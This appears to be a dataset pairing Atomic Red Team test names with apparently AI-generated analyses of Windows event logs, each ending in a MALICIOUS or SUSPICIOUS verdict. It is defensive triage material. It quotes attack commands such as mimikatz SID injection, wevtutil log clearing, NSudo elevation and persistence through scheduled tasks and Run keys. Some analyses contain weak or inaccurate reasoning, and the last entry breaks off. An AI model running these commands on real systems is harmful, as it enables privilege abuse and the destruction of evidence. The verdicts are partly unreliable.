Thread Execution Hijacking,"### Detailed Analysis of the Logs

#### Windows PowerShell Log

- **Command Execution**: The PowerShell commands executed on the system are suspicious. The logs show the execution of `InjectContext.exe`, which is a known tool used for process injection techniques. Process injection is commonly used by malware to execute code in the context of another process, evading detection by security software.
- **Script Characteristics**: The PowerShell command attempts to start `notepad.exe`, waits for 5 seconds, and terminates it, alongside executing `InjectContext.exe`. This pattern is indicative of behavior testing or malicious testing using tools from frameworks like Atomic Red Team.

#### Sysmon Log

- **Process Activity**: There is detailed logging of processes such as `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and the suspicious `InjectContext.exe`. The execution of `wevtutil.exe` to clear event logs `cl` (clear log) is highly suspicious, indicating possible cover-up actions after malicious activity.
- **High Integrity Level**: Processes executed at a ""High"" integrity level show they were running with elevated privileges, which can be an abuse of privilege if leveraged maliciously.

#### Application Log

- The entry here is benign and indicates routine system logging activity by Software Protection Service (SPP).

#### Security Log

- **Log Clearance Events (1102)**: The security log has been explicitly cleared by the user `admin_test`. Log clearance is a strong indicator of malicious intent, as it's often done to cover tracks post-compromise or unauthorized activity.
- **Privilege Escalation (4672)**: The user `admin_test` obtained a series of elevated privileges, including `SeDebugPrivilege`, which allows for debugging access to all processes on the system. Such privileges enable further malicious actions within the system.

#### System Log

- **Log Clearance**: System and PowerShell event logs have been cleared, correlating with suspicious activities observed in other logs.

### Threat Assessment

The combination of suspicious execution of `InjectContext.exe`, log clearance activities, and privileged actions all point toward potential malicious activities occurring on the host `Server002`. The use of a known offensive tool (`InjectContext.exe`) and the clearing of logs are particularly strong indicators of compromise.

### Guidance and Resolution

#### Resolution: **MALICIOUS**

Given the presence of potentially malicious process injection, combined with suspicious log clearance activities and privilege escalations, these logs are indicative of malicious activity. The user account `admin_test` was likely leveraged for this purpose.

#### Suggested Next Steps:

1. **Immediate Containment**: Isolate the affected host (`Server002`) from the network to prevent further propagation or damage.
2. **Forensic Analysis**: Conduct a comprehensive forensic analysis to identify any additional indicators of compromise and the full extent of the breach.
3. **Credential Review**: Change passwords for impacted accounts, especially those with elevated privileges.
4. **Apply Security Patches**: Ensure that the system is updated with the latest security patches to mitigate any exploited vulnerabilities.
5. **Monitoring and Detection**: Increase logging and monitoring on all systems, looking for similar behavior patterns or signs of an advanced persistent threat."
Dirty Vanity process Injection,"### Detailed Analysis of the Windows Event Logs

#### Indicators of Malicious Activity
1. **Event Log Clearing**:
   - The logs contain several ""LogFileCleared"" events (Event ID 104), indicating that the admin_test user has cleared the Application, System, and Windows PowerShell event logs. This action is typically suspicious and could indicate an attempt to cover tracks after malicious activity.

2. **PowerShell Activity**:
   - The PowerShell logs demonstrate a specific PowerShell command execution using Start-Process to launch an executable `redVanity.exe` alongside `calc.exe`. The execution of binaries from the `AtomicRedTeam` directory suggests potential usage of a known security testing tool.
   - The PowerShell command logs events suggest executing a payload using process injection technique simulation (T1055 technique from ATT&CK framework), leading to the execution of `calc.exe` which further suggests testing or simulated attack activity.

3. **Security Privileges**:
   - Multiple logs (Event ID 4672) indicating that the `admin_test` account was granted special privileges (e.g., SeDebugPrivilege, SeBackupPrivilege). While the presence of these might be justified in some admin scenarios, when correlated with the clearing of logs by the same user, it raises concerns about privilege abuse.

4. **Use of `wevtutil`**:
   - The usage of `wevtutil.exe` in sysmon log entries for clearing event logs further corroborates the report that someone has deliberately attempted to clear the logs (to remove traces of activity).

5. **Date/Time Manipulation**:
   - Time creation events with Event ID 4616 suggest changes to the system time, which can be used to evade detection or correlate events incorrectly.

6. **Suspicious Executable Paths and Launches**:
   - Execution of binaries (`redVanity.exe`) from the temporary user application data folder is unusual under regular operational circumstances and points toward either a test scenario or a covert operation.

#### Overall Assessment
The combination of cleared event logs, execution of known security testing tool binaries from uncommon directories, manipulation of system time, and the granting of elevated privileges indicates orchestrated activities that resemble techniques used in penetration testing or potential malicious activities.

Given these findings, the actions logged cannot be definitively determined as benign without further context, such as approved security testing or red team exercises. However, the seriousness of the activities performed, especially the event log clearing immediately suggestive of someone trying to hide operations, leans heavily towards indicating an intentional and potentially malicious behavior.

### Conclusion: SUSPICIOUS

**Guidance on How to Proceed**:
- Immediately audit the activities and credentials of `admin_test` to determine the authorization and intent behind the actions recorded.
- Perform an exhaustive scan of the host and correlated network devices for additional anomalies or unauthorized access.
- Review organization policies regarding the use of security assessment tools and potential ongoing penetration tests for cross-verification.
- Conduct personnel interviews or access logs to determine if actions were authorized as part of an internal security assessment or training exercise.
- Implement enhanced monitoring and alerting for similar activities across the network infrastructure.
- If unauthorized activity is confirmed, initiate incident response procedures to contain potential threats and mitigate risk."
Process injection ListPlanting,"Upon analyzing the logs provided, there are several key points to consider:

### Suspicious or Anomalous Behavior
1. **Frequent Use of `wevtutil.exe`**: This utility is used to interact with the event logs on Windows. It appears multiple times commanded by `admin_test` to clear the event logs (channels: Sysmon, Application, System, Security, and Windows PowerShell). This activity is typically not standard for regular system maintenance.
 
2. **Admin Privileges**: The user `admin_test` is executing actions with high integrity levels and elevated privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.), indicating potential administrative access being utilized suspiciously.

3. **Clearance of Logs**: Security logs were cleared, as seen in EventID 1102 from the Security log. Clearing logs is a significant red flag, especially when tied to targeted log channel clearances in Sysmon logs, identified in the system logs (EventID 104).

4. **Use of PowerShell**: The PowerShell logs show a suspicious PowerShell command that utilizes a temporary directory (`AtomicRedTeam\T1055.015\bin\ListPlanting.exe`) potentially used for running AtomicRedTeam tests or mimic activities common with adversarial engagements.

5. **Execution of Potential Malicious Commands**: A specific PowerShell execution command mentions starting a potentially suspicious process, possibly used for testing or exploring vulnerabilities (`ListPlanting.exe`).

6. **Network Information**: There are multiple logon events using NTLM from a non-local IP (`172.18.16.1` and `fe80::866a:d1f8:8d06:7bc`), which should be investigated to determine if such connections are legitimate and authorized.

### Malicious Activity or Compromise
- **Clear Indicators of Log Tampering**: The frequent clearing of logs suggests an attempt to cover tracks, commonly observed during malicious activities like privilege escalation attempts.
- **Use of Administrative PowerShell Scripts in Suspicious Locations**: The execution of specific processes and scripts in directories like `Temporary`, often used by attackers for transient operations, points towards unauthorized or malicious intentions.

### Assessment
The logs exhibit multiple signs of suspicious and potentially malicious activities driven by the user account `admin_test`. The behavior of clearing crucial event logs combined with the nature of the PowerShell script execution raises significant concerns about a possible breach or unauthorized access incident.

### Resolution
**MALICIOUS** - The behavior observed, including the clearing of logs, elevated privilege usage, and execution of potentially dubious scripts, indicates a strong likelihood of malicious activity.

### Guidance
1. **Immediate Audit**: Conduct a thorough audit of `admin_test` user account activities and validate if they had legitimate reasons for clearing logs and executing scripts. Confirm if the AtomicRedTeam engagement or similar activities were authorized.
  
2. **Network Monitoring**: Investigate the origin of the IP addresses associated with the logon events to ascertain if they are part of trusted networks or external threats.

3. **Incident Response**: Suggest immediate incident response actions to secure the environment, which might include isolating the affected system, and strengthening log monitoring to detect any further suspicious activities.

4. **Forensic Analysis**: Undertake a more in-depth forensic analysis of the systems involved to identify any indicators of compromise that may not have been immediately apparent."
Parent PID Spoofing - Spawn from Specified Process,"Upon review of the provided Windows event logs, the following points of interest and analysis are noted:

### System Log:
1. **Event ID 104**: Multiple event logs cleared (Channel: System, Windows PowerShell).
   - **Analysis**: Log clearing is often associated with malicious activity, as it may indicate an attempt to cover tracks after conducting unauthorized actions.

### Windows PowerShell Log:
1. **PowerShell Execution**: The presence of a command `Start-ATHProcessUnderSpecificParent -ParentId $PID -TestGuid ...` and Powershell execution with a restricted policy.
   - **Analysis**: Starting processes under a specific parent and using PowerShell with restricted execution policy can indicate suspicious activity, possibly attempting privilege escalation or launching a hidden process.
2. **Command Execution**: `$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); ...`
   - **Analysis**: This command hints at a script trying to match patterns possibly indicative of unauthorized installations or modifications.

### Security Log:
1. **Log File Cleared (Event ID 1102)**: Security log cleared by `admin_test`.
   - **Analysis**: Clearing security logs is a common red-flag activity often associated with malicious actions attempting to hide evidence.

### Sysmon Log:
1. **Process Executions**: `wevtutil.exe` was used multiple times with command-line operations to clear logs.
   - **Analysis**: The use of `wevtutil.exe` to clear event logs further supports possible malicious activity. Event log manipulation is a strong indicator of an attempt to remove traces of actions.
2. **Frequent PowerShell Executions**: High integrity and logged in as `admin_test`, executing potentially obfuscated commands.
   - **Analysis**: This provides another layer of suspicious behavior, as PowerShell can be used to execute scripts maliciously.

### Assessment and Conclusion:
The provided logs indicate multiple behaviors consistent with malicious activity:
- Clearing of event logs across different channels (System, Security, Windows PowerShell).
- Suspicious PowerShell activity involving control over process execution and an attempt to identify potential unauthorized installations.

The combination of log clearing, suspicious process commands, and PowerShell execution with elevated privileges strongly suggests that the actions taken were not benign. This entire pattern of behavior is characteristic of a potential compromise or attack on the system.

### Final Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Response**: 
   - Isolate the affected system to prevent further unauthorized access or lateral movement within the network.
   - Perform a thorough forensic investigation to identify the entry point and scope of the compromise.

2. **Remediation Actions**:
   - Review and enhance system and network monitoring mechanisms to detect similar activities.
   - Consider changing all privileged passwords and possibly reset user accounts as a precaution.

3. **Reporting and Documentation**:
   - Report the incident to required authorities and stakeholders.
   - Document the findings and actions taken for future reference and mitigation efforts. 

This incident should be treated as a serious security breach and appropriate steps should be taken to mitigate further risk."
Driver Installation Using pnputil.exe,"Upon reviewing the log entries, several activities and sequences stand out that require further analysis to discern whether they indicate potential malicious actions:

1. **Event Log Clearing**: Notably, there are multiple instances indicating that event logs have been cleared (Event ID 1102 in the Security log and Event ID 104 in the System log). This action is generally suspicious because malicious actors often clear event logs to hide their tracks after a system compromise.

2. **Usage of PowerShell**: PowerShell was used to execute `pnputil.exe`, which is a legitimate utility for managing driver packages (`Event ID 1` related to `powershell.exe` and subsequent interactions with `pnputil.exe`). While the utility itself is legitimate, its execution via PowerShell could be an indication of automated tasks or potentially suspicious activity especially if it's not consistent with normal operations on the host.

3. **High Integrity and Privileges**: The actions are performed with high integrity levels and include privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are potent capabilities that allow significant control over the system. These privileges were raised in the logon events (Event ID 4672), which typically accompanies administrative actions but can be alarming if unexpected.

4. **Frequent Process Creation with `wevtutil.exe`**: The `wevtutil.exe` command-line utility was frequently used to clear logs across different logs (`Microsoft-Windows-Sysmon/Operational` and `Application`). This repeated usage suggests an attempt to cover activities quickly after they happen.

5. **Suspicious Process Execution Sequence**: The sequence from PowerShell to PnPUtil, followed by log clear events and various system utilities (like `whoami`, `hostname`), are typical enumeration actions seen in lateral movement stages of an attack, suggesting a potential discovery phase, though this pattern doesn't confirm maliciousness on its own without additional context.

Based on this analysis, the logs reflect behavior that is strong enough to warrant further investigation, given the potential for malicious activity:

- **Risk of Malicious Activity**: The combination of event log clearing, potential unauthorized privilege usage, and suspicious PowerShell execution patterns are all indicators consistent with post-compromise behavior, making it imperative to investigate further.

- **Actionable Guidance**:
  - Immediate review of related systems for unauthorized access.
  - Examine any recent system or network-level changes that align with the logs provided.
  - Consider restoring from backups if confirmed unauthorized modifications happened.

Final Assessment: **SUSPICIOUS** - The logs present suspicious behavior that requires further investigation to either confirm or rule out a compromise."
Launch NSudo Executable,"Upon analyzing the provided Windows event logs, several indicators suggest potential malicious activity. Below is a detailed analysis of the findings:

### System Log Analysis
1. **Event ID 104**: Indicates log clearing by user `admin_test` for both the System and Windows PowerShell channels. This can be a sign of malicious activity, as clearing logs can be an attempt by an attacker to cover their tracks.

### Security Log Analysis
1. **Event ID 1102**: The Security log was also cleared by `admin_test`. Similar to Event ID 104 in the System log, this action is typically associated with attempts to hide unauthorized or malicious activities.

2. **Event ID 5379**: Multiple attempts to access or use some account data (MicrosoftAccount:user=02txoixylodcstop) failed with ReturnCode `3221226021`. While these seem to be failed attempts, the persistence and pattern may suggest attempts to access restricted resources or accounts.

3. **Event ID 4798**: Examination of local group membership using `taskhostw.exe`, a system process typically used for hosting tasks in the Windows Task Scheduler service. If this process is used inappropriately or out of the ordinary, it can be indicative of privilege escalation attempts.

### Windows PowerShell Log Analysis
1. **Event ID 600**: PowerShell is used to execute `NSudoLG.exe` with high privileges (`-U:T -P:E cmd`). This particular operation suggests an attempt to run commands with escalated privileges to bypass security controls, which is a common tactic used by attackers.

### Sysmon Log Analysis
1. **Event ID 1 and 5**: Frequent execution of `wevtutil.exe cl` to clear logs in multiple channels—System, Security, and Windows PowerShell—again highlights attempts to remove evidence of potentially malicious activities by the user `admin_test`.

2. **Execution of NSudoLG.exe via PowerShell**: This tool is known for allowing commands to be run with elevated privileges, often used to bypass security mechanisms.

### Application Log Analysis
- No specific malicious indicators noted, as Windows Defender state is on.

### Conclusion
Considering the evidence gathered from different logs:
- The clearing of multiple event logs (System, Security, and PowerShell).
- The use of `NSudoLG.exe` to escalate privileges.
- The suspicious and repeated execution of potentially illegitimate processes.
  
These activities strongly indicate unauthorized exploitation and potential malicious behavior.

### Resolution
The actions identified in these logs lead to the conclusion that these logs contain **MALICIOUS** activity. Immediate steps should be taken to investigate the source of the actions, identify compromised accounts, and secure the affected systems. Engage incident response procedures to contain and mitigate potential threats."
Scheduled Task Startup Script,"Based on the provided event logs, I have analyzed the entries and identified some key points that indicate suspicious and potentially malicious activity on the Windows host:

1. **Event Log Clearing**:
   - The logs indicate multiple instances of event log clearing activities, as seen in the Security log entry (EventID 1102) and the System log entries (EventID 104). The `wevtutil.exe` was used to clear logs from multiple channels (Sysmon, Application, System, and Security).
   - The `admin_test` account was used to clear these logs, raising suspicion as log clearing is often a tactic used by malicious actors to hide their tracks.

2. **Process Activity**:
   - There are several instances of `wevtutil.exe` being executed by the user `admin_test`. The usage pattern, especially combined with the command to clear logs across multiple Windows components, aligns with actions typically taken to cover up evidence of changes or intrusions.
   - The usage of `schtasks.exe` in conjunction with `cmd.exe` to create scheduled tasks named `T1053_005_OnLogon` and `T1053_005_OnStartup`, both of which are set to execute `calc.exe`, suggests potential persistence mechanisms being set up.
   - The command line used indicates the creation of tasks that execute on login and startup, which is a known technique used by malware to maintain persistence on an infected system.

3. **Unusual Command Execution**:
   - The execution of `cmd.exe` to create scheduled tasks with privilege execution as `SYSTEM` is highly suspicious. This behavior is consistent with techniques to gain or maintain unauthorized access.

Given the combination of event log clearing, suspicious process executions, and the setting up of scheduled tasks for persistence, the activities in the provided logs strongly indicate malicious behavior.

**Assessment**: 
- The logs exhibit clear signs of malicious activity, including log tampering, potential information tampering or theft, and unauthorized persistence mechanisms.

**Resolution**: 
- **MALICIOUS** - The evidence from the logs suggests that there is a deliberate attempt to conduct malicious activity, including covering tracks and establishing persistence. Immediate remediation steps should be taken.

**Guidance on How to Proceed**:
1. **Immediate Response**:
   - Isolate the affected machine (`Server002`) from the network to prevent further spread or data exfiltration.
   - Review all scheduled tasks and disable any that are suspicious, particularly those referenced in the logs.

2. **Forensic Investigation**:
   - Conduct a thorough forensic analysis of the host to identify how the malicious actor gained access.
   - Examine file system artifacts, registry changes, additional command executions, and look for indicators of malware or unauthorized tools.

3. **System Hardening and Monitoring**:
   - Ensure all systems are patched and up to date.
   - Implement monitoring for unusual process executions and system changes, particularly those involving log clearing utilities and scheduled tasks.
   - Consider deploying endpoint detection and response tools to provide enhanced visibility into endpoint activities.

4. **User Account Review**:
   - Review the permissions and activities of the `admin_test` account and any other accounts that could have been compromised.
   - Require password changes for all privileged accounts and consider implementing multi-factor authentication.

Taking these steps will help in identifying the root cause of the compromise and prevent future incidents."
Password Change on Directory Service Restore Mode (DSRM) Account,"### Detailed Analysis of Provided Windows Event Logs

Upon reviewing the provided Sysmon, System, Security, Application, and PowerShell logs, we can draw several points of interest which might indicate suspicious or malicious activity.

#### Sysmon Log Analysis

1. **Recurrent Use of `wevtutil.exe`**:
   - The `wevtutil.exe` process, responsible for managing event logs, was executed multiple times to clear logs from various channels (Sysmon/Operational, Application, System, Security, and Windows PowerShell). The persistent clearing of logs, especially without an apparent legitimate administrative task justification, is a red flag. This can be an attempt to cover up malicious activities.
 
2. **Use of `cmd.exe` with `ntdsutil`**:
   - Execution of `cmd.exe` with a command-line that includes `ntdsutil` and the option to ""sync from domain account %%username%%"" can be suspicious, especially if not typical for user operations on the server. This can indicate potential Active Directory manipulation or reconnaissance attempts.

3. **Processes Execution from High Integrity Level**:
   - All processes (e.g., conhost.exe and whoami.exe) inherited a high integrity level, suggesting they were executed with elevated privileges.

#### System Log Analysis

1. **Event Log Clearing Activity (Event ID: 104)**:
   - The clearing of system logs by the user `admin_test` is evident. This behavior is consistent with attempts to obfuscate activities on the host and is indicative of potential malicious behavior.

2. **Time Manipulation Detected**:
   - Time appeared to be adjusted or time manipulation occurred (Event ID: 4616). This activity could be part of a technique used to ""backdate"" system timestamps to disrupt logs further or create an alibi.

#### Security Log Analysis

1. **Event Log Clear (Event ID: 1102)**:
   - The user `admin_test` also cleared security logs, aligning with the Sysmon findings regarding `wevtutil.exe`. Such activity is suspicious and suggests potential malicious intent trying to erase traces of administrative actions.

2. **Privilege Escalation (Event ID: 4672)**:
   - The user `admin_test` is associated with a session obtaining additional privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). This could suggest an elevation of privileges for unauthorized tasks.

#### Application Log Analysis

- The presence of regular Software Protection Platform Service events doesn't directly indicate suspicious activity; however, any modification in services as part of the logs clearing process could relate to present attempts for obfuscation.

### Assessment and Conclusion

Based on the detailed log analysis:

- **Indicators of Malicious Activity:**
  - Multiple event logs were cleared by what appears to be the same user (`admin_test`), a common indicator of malicious intent.
  - The `ntdsutil` command execution suggests possible Active Directory manipulation.
  - Elevated privileges were used extensively in conjunction with these actions, indicating a higher risk of privilege escalation attacks.

### Guidance on How to Proceed

1. **Immediate Response Actions:**
   - Isolate the affected host (Server002) from the network to prevent potential lateral movement or further malicious activity.
   - Perform a thorough forensic analysis of the file system and memory to understand the scope and vector of the compromise.

2. **Review and Monitoring:**
   - Review user account `admin_test` for unusual activity and potential compromise.
   - Increase logging and monitoring post-recovery to detect future suspicious activities quickly.

3. **Policy and Procedure Updates:**
   - Implement strict controls and auditing for log clearance activities.
   - Ensure adequate user education on recognizing and reporting suspicious behavior.

### Final Resolution:

- **MALICIOUS**: The logs contain activities that are strongly indicative of an attempt to obfuscate actions through log clearance, indicative of malicious behavior typically associated with system intrusion or unauthorized administration."
Injection SID-History with mimikatz,"Upon reviewing the provided logs from the Windows host ""Server002"", several indicators suggest potentially malicious activity:

1. **Execution of Mimikatz:**  
   - The Sysmon log indicates the execution of `mimikatz.exe` from a temporary directory with a command line that includes privilege escalation commands such as `privilege::debug`, `sid::patch`, and `sid::add`. This is a well-known tool used for extracting Windows credentials and is often associated with post-exploitation activities. 
   - The command line `""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe` and similar involvement of Mimikatz further corroborate this.

2. **Event Log Clearing:**  
   - The logs indicate that multiple event logs (`System`, `Security`, and `Windows PowerShell`) were cleared by the user `admin_test`. This includes Sysmon, which would typically log detailed system and security events. Event log clearance is a common tactic among attackers to cover their tracks and hamper forensic analysis.

3. **Repeated use of `wevtutil.exe` for Clearing Logs:**
   - The execution of `wevtutil.exe` with the `clear` command for various logs including `System`, `Application`, and `Security` indicates log tampering. The presence of `C:\\Windows\\System32\\wevtutil.exe cl [Channel]` suggests intentional deletion, usually for obfuscating malicious activities.

4. **Privilege Escalation Indicators:**
   - The command involving Mimikatz shows attempts of privilege escalation by modifying security identifiers (SIDs). This is a direct attempt to gain higher privileges within the system, a standard attack vector used in attacks trying to maintain persistence or perform sensitive activities.

Based on these findings, the activities recorded in the logs are highly indicative of a security breach with potentially significant ramifications, including credential theft and unauthorized access. Therefore, the assessment of the situation is:

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the affected system from the network to prevent lateral movement.
   - Initiate an incident response procedure specific to credential theft and potential data breach scenarios.

2. **Forensic Analysis:**
   - Conduct a detailed forensic examination of the system to identify all footprint and artifacts left by the attacker.
   - Retrieve any untouched logs or external backups for analysis.

3. **Credential and Access Audit:**
   - Reset passwords for all accounts accessed from the compromised host.
   - Review access logs for other systems in the network to identify potential lateral movement or data exfiltration.

4. **Patch and Mitigation:**
   - Ensure all systems are patched and protected against known vulnerabilities.
   - Implement enhanced monitoring and detection mechanisms across the network, with a focus on anomaly detection.

5. **User Education and Security Policies:**
   - Train users on recognizing and reporting suspicious activity.
   - Review and update security policies, especially around privileged access and use of third-party tools. 

The situation should be monitored continuously, and steps should be taken to harden the security posture of the organization to prevent recurrence."
Create a new time provider,"Based on the analysis of the provided logs, here is a detailed assessment of the situation:

### Suspicious and Anomalous Behavior:
1. **Event Log Clearing:**
   - The `System`, `Windows PowerShell`, and `Security` logs have been cleared as indicated by Event ID 1102 in the Security log, and Event ID 104 in the System log. The user `admin_test` performed these actions, which often occur as an attempt to cover tracks during or after malicious activities.

2. **PowerShell Command Execution:**
   - A PowerShell script executed several commands indicative of a suspicious behavior, particularly the use of PowerShell to manipulate system settings (`w32time` service and registry keys). The script attempts to register a custom time provider using `AtomicTest.dll`, a behavior commonly associated with persistence mechanisms or malicious testing frameworks such as Atomic Red Team. This is evidenced by the events in the PowerShell log showing `Copy-Item` and `reg add` commands.

3. **Service Manipulation:**
   - The logs show the stopping and starting of the `w32time` service using the `net` command, all executed via PowerShell, which is atypical under normal operations. This kind of service manipulation could be a way to effect changes to the time service, potentially to disrupt security logging timestamps or other security mechanisms.

4. **Execution of Potential Malicious DLL:**
   - The moving and registering of `AtomicTest.dll` in the registry under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest`, indicates possible attempts to execute a malicious DLL upon certain system actions, thereby gaining persistence on the system.

5. **Kernel and Time Change Events:**
   - Events show a slight time adjustment, which, while not inherently malicious, could be coordinated with other time-based activities, such as time-based evasion techniques or alteration of logs.

### Indicators of Malicious Activity:
- The use of `wevtutil.exe` to clear logs, particularly by a non-administrative path through `admin_test`.
- Usage of a known test payload `AtomicTest` from a known security framework (ATOMIC Red Team) for simulating attack vectors, possibly indicating testing or malicious activities if not authorized.

### Assessment and Conclusion:
Given the clearing of event logs, manipulation of system services (especially time service), and involvement of potentially malicious and suspicious DLL activities, these logs indicate high potential for malicious activities or compromise. The activities are consistent with those seen in a post-exploitation phase where an attacker attempts to cover their tracks and establish persistence.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Actions:**
  - Isolate the affected host from the network to prevent any further communication or data exfiltration.
  - Increase logging and monitoring on the involved systems and other critical systems in the network.
  - Initiate a deeper forensic investigation to understand the full scope and to identify any additional compromised hosts or data breaches.
  - Consider restoring the system from a known good backup if further analyses confirm that persistence mechanisms have been established.
  
- **Follow-up Actions:**
  - Review and enrich security policies regarding administrative access and PowerShell usage.
  - Implement or update intrusion detection/prevention systems to alert on similar activities in the future.
  - Conduct user training and raise awareness to avoid executing unauthorized scripts or tools.
"
Process Injection with Go using UuidFromStringA WinAPI,"### Log Analysis:

Upon reviewing the given logs, I have identified several activities that require attention:

1. **Clearing of Event Logs:**
   - In the **System log** and **Security log**, the user `admin_test` cleared logs using `wevtutil.exe`. Such actions can be indicative of an attempt to cover malicious activities.

2. **Suspicious PowerShell Activity:**
   - In the **Windows PowerShell log**, PowerShell was executed with the command:  
     ```
     powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055\bin\x64\UuidFromStringA.exe -debug}
     ```
   - The path and usage of a tool from `AtomicRedTeam` suggest penetration testing or potential misuse. Atomic Red Team tools can mimic typical adversary tactics, techniques, and procedures (TTPs), which may be used maliciously if not sanctioned.

3. **Use of `wevtutil.exe`:**
   - Various instances of `wevtutil.exe` were executed by `admin_test`, clearing different logs (Sysmon, Application, System, Security, Windows PowerShell). This utility is typically used for managing event logs and again hints at attempts to erase traces.

### Assessment:

- **Indicators of Potential Malicious Activity:**
  - The actions of clearing logs directly suggest that someone may be trying to hide their tracks after potentially malicious behavior.
  - The PowerShell command execution involving a tool typically used for adversary simulations (even if legitimate) should be treated as suspicious unless fully accounted for by security testing protocols.

### Threat and Risk Assessment:

- **Threat Level:** High
  - The evidence points to attempts at obfuscating system activities.
  - The execution of potentially dangerous tools without clear organizational context raises flags.

### Resolution:

**SUSPICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Confirm whether `admin_test` was conducting authorized penetration testing. If not, escalate the issue as unauthorized access and potential risk.
   - Change or monitor `admin_test` account credentials and logins to prevent further unauthorized activities.
   - Check for any other instances or remote systems that have been accessed using `admin_test` credentials.

2. **Further Investigation:**
   - Cross-reference the system logs with network activity to identify any unusual outbound connections that occurred around the same time.
   - Analyze other systems within the environment for similar activity to determine if this is part of a wider attack or test.
   - Review security policies and ensure only necessary personnel are authorized to clear event logs and run testing tools.

3. **Preventive Measures:**
   - Strengthen logging policies; consider alerts on log-clearing activities.
   - Increase PowerShell logging to capture full command strings and script block logs.
   - Implement access controls and role-based permissions to limit who can clear logs and run penetration tools.

Proceed with these actions to ensure the security and integrity of your systems."
"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","Upon analyzing the available Windows event logs, several suspicious activities suggest potential malicious behavior. Here's a detailed breakdown:

### 1. **Log File Clearing**:
- **Security Event ID 1102**: Indicates that the security event log was cleared by the user ""admin_test"". This activity is usually non-standard and can be an indication of cover-up attempts after unauthorized activities.
- **System Event ID 104**: Shows that the system log and PowerShell log were also cleared around the same time, by the same user. This repeated log clearing heightens the suspicion of malicious intent.

### 2. **Process Execution with Sysmon Logs**:
- **Multiple Executions of `wevtutil.exe`**: This utility was used to clear logs (`""wevtutil.exe"" cl` command), correlating with the log clearing events in the Security and System logs. Using `wevtutil` to clear logs is a red flag and is often part of an attacker's attempt to cover tracks.
  
- **Command-line Execution Using `cmd.exe` with PsExec**:
  - An execution of `cmd.exe` involved PsExec, a known tool for executing processes on remote systems. The command references external executables like `GhostTask.exe`, which are unusual and suggest possible attempts to execute or deploy unauthorized tasks or payloads. The reference to `AtomicRedTeam`, a known framework for simulating adversary techniques, hints that this might be either testing or potentially malicious activity.

### 3. **Potential Staging or Post-Exploitation Activity**:
- **Processes like `whoami.exe` and `HOSTNAME.EXE`** executed can indicate environment reconnaissance, which attackers often use in the early phases of a compromise to gather system information.

### 4. **Miscellaneous Process Executions**:
- **Edge Update Executions**: Though legitimate, the timing and the lack of context around these updates could be worth investigating further. However, these may not directly relate to malicious actions unless there are additional indicators.

### Conclusion:
Based on the patterns of log clearing, suspicious process creation, especially using tools like `wevtutil.exe` for log manipulation and external payload commands, the activities align more closely with post-exploitation or adversary simulation tools. The simultaneous clearing of critical logs such as Security, System, and PowerShell heavily suggests malicious intent, particularly coordinated to hide actions from an audit perspective.

**Resolution**: **MALICIOUS**

### Guidance:
1. **Immediate Actions**:
   - Conduct full endpoint forensic analysis to trace back any additional unauthorized activities.
   - Isolate the host from the network to prevent lateral movement.
   - Review and potentially reset access credentials for the user ""admin_test"" and any other privileged accounts.

2. **Remediation Steps**:
   - Restore from clean backups, ensuring that prior to restoration, the infection vector (e.g., PsExec deployment paths) is identified and blocked.
   - Apply security patches and enhance the monitoring of sensitive commands like `wevtutil` and tools like `PsExec`.

3. **Long-Term Recommendations**:
   - Implement stricter log monitoring and alerting for events like log clearance.
   - Conduct regular security awareness training to ensure users recognize suspicious activities and increase their understanding of cybersecurity best practices."
HKCU - Policy Settings Explorer Run Key,"### Detailed Analysis

Based on the provided logs, several events stand out as indicators of suspicious or potentially malicious activity:

1. **Event Logs Clearing**:
   - **System Log Entries (EventID 104)**: These indicate that the logs for both the ""System"" and ""Windows PowerShell"" channels were cleared by the user ""admin_test"". Log clearing is a typical tactic used by attackers to cover their tracks after obtaining unauthorized access. This is a red flag for possible malicious activity.

2. **Security Log Clearing**:
   - **Security Log Entry (EventID 1102)**: This confirms that the security logs were also cleared by the same user, **admin_test**. Similar to the system logs, the clearing of security logs further strengthens the suspicion of malicious intent.

3. **Suspicious PowerShell Activity**:
   - **Sysmon Logs** and **Windows PowerShell Log Events** indicate the execution of a PowerShell command that modifies the registry. The command involves creating a new registry key (`HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`) and sets a property to launch `C:\Windows\System32\calc.exe`. This behavior is indicative of a persistence mechanism, as modifying the registry to configure programs to run at startup is often associated with malware activity.

4. **Frequent Use of PowerShell and Command Line Tools**:
   - The Sysmon logs show an excessive use of command-line utilities such as `whoami.exe`, `wevtutil.exe`, and multiple instances of `conhost.exe` spawned, predominantly by the user ""admin_test"". This pattern of activity can indicate an attempt to explore the environment and tamper with the event logs, possibly to hide malicious activities.

### Assessment

- The logs demonstrate a pattern of log clearing and PowerShell execution to make registry modifications. These activities are strongly associated with malicious behavior typically seen in security breaches, particularly where attackers seek to escalate privileges, establish persistence, or remove evidence of their activities.
  
- The use of `wevtutil.exe` to clear multiple event logs and alter PowerShell's runtime environment further suggests that these actions were not typical administrative tasks but were likely intended to obfuscate malicious activities.

### Threats and Risks Identified

- **Persistence Mechanisms**: The registry modification via PowerShell to execute `calc.exe` is a potential persistence mechanism, which may indicate further undetected modifications or payloads designed to execute at login or other triggering events.

- **Security Evasion**: Cleared logs suggest an active attempt to hinder detection by removing evidence of potentially malicious commands or activities.

### Guidance on How to Proceed

1. **Immediate Containment**: 
   - Isolate the affected machine from the network to prevent further activities.
   
2. **Full System Analysis**:
   - Conduct a thorough investigation of the system for any additional malicious indicators and perform a complete scan for malware.

3. **Review and Restore Security Logs**:
   - Attempt to retrieve backups of the cleared logs, if available, to determine the origin and full scope of the activities.

4. **User Activity Review**:
